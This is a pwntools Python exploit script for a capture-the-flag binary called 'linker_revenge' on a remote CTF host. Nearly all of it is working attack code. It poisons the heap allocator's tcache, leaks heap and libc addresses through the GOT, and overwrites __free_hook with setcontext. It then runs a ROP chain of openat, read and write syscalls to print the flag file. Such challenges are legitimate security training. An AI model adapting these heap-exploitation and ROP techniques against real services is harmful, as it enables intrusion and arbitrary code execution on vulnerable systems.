from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './linker_revenge'
HOST = 'linker-revenge.3k.ctf.to'
PORT =  9632

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def login(size, name):
    r.sendlineafter('size:\n', str(size))
    r.sendlineafter('name:\n', name)

def create(size):
    r.sendlineafter('> ', '1')
    r.sendlineafter('size:\n', str(size))

def edit(idx, content):
    r.sendlineafter('> ', '2')
    r.sendlineafter('index:\n', str(idx))
    r.sendafter('content:\n', content)

def delete(idx):
    r.sendlineafter('> ', '3')
    r.sendlineafter('index:\n', str(idx))

def show(idx):
    r.sendlineafter('> ', '5')
    r.sendlineafter('index:\n', str(idx))

r = start()

login(8, 'A')
for i in range(8): 
    create(0x68)
    delete(0)

edit(0, p64(0x602040-8+5))
create(0x68)
create(0x68)
create(0x68)
delete(0)
delete(2)
payload = ''
payload += 'A'*3
payload += flat(0, 0)
payload += p32(0x68) * 4
payload += flat(0, 0)
payload += p32(0x1) * 4
payload += flat(0, 0)
payload += flat(elf.got.puts, 0x602060)
edit(1, payload)
show(2)
leak = u64(r.recvuntil('\n')[:-1].ljust(8, '\x00'))
heap = leak - 0x2210 - 0x1000
dbg('leak')
dbg('heap')
show(0)
leak = u64(r.recv(6).ljust(8, '\x00'))
dbg('leak')
base = leak - 0x80a30
dbg('base')
libopenat = base + 0x10ff80
libwrite = base + 0x110250
libread = base + 0x100180
setcontext = base + 0x52110 + 0x35
mh = base + 0x3ebc30
fh = base + 0x3ed8e8

rdi = base + 0x0002155f
rsi = base + 0x00023e8a
rax = base + 0x00043a77
rdx = base + 0x00130866
r10 = base + 0x00130865
p3 = base + 0x00021a42
sub_eax_edx = base + 0x00043999

syscall = base + 0x000d29d5


bss = 0x602110

payload = ''
payload += p32(0x68) * 4
payload += p32(0x68) * 4
payload += p32(0x1) * 4
payload += p32(0x1) * 4
# payload += flat(fh, 0x602060)
payload += flat(fh, 0x602060, heap+0x22a0, heap+0x22a0+0x68, heap+0x22a0+0x68*2)
edit(1, payload)
edit(0, p64(setcontext))

# edit(2, flat(1, 2, 0x3, 0x4, 0x5, 0x6, 0x7, 0x8, 0x9, 0xa, 0xb, 0xc, 0xd))
edit(3, '/home/ctf/flag'.ljust(0x20, '\x00') + flat(0x15, 0x16, 0x17, heap+0x22a0+0x68*2, rdi+1, 0x1a, 0x1b, 0x1c, 0x1d))
# edit(2, '/proc/self/cwd/'.ljust(0x20, '\x00') + "flag".ljust(0x8, '\x00') + flat(0x16, 0x17, heap+0x22a0+0x68*2, rdi+1, 0x1a, 0x1b, 0x1c, 0x1d))
edit(4, flat(rdi, 0, rsi, heap+0x22a0+0x68, rdx, 0, rax, 0x101, r10, 0, syscall, rdx, 0x20))

payload = ''
payload += p32(0x68) * 4
payload += p32(0x68) * 4
payload += p32(0x1) * 4
payload += p32(0x1) * 4
# payload += flat(fh, 0x602060)
payload += flat(heap+0x22a0, heap+0x22a0+0x68*3, heap+0x22a0+0x68*4, heap+0x22a0+0x68*5)
edit(1, payload)

edit(1, flat(rdi, 6, rsi, bss, rdx, 0x80, rax, 0, syscall, rdi, 1, rsi, bss)) # exploit
# edit(1, flat(rdi, 6, rsi, bss, rax, 5, syscall, rdi, 1, rsi, bss, rdx, 0x80))
edit(2, flat(rdx, 0x80, rax, 1, syscall, elf.sym.notepad)) # exploit
if args.D:
    debug(r, [0x10a4])
# edit(4, flat(0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3a, 0x3b, 0x3c, 0x3d))
delete(0)
context.log_level = 'debug'
r.interactive()
r.close()
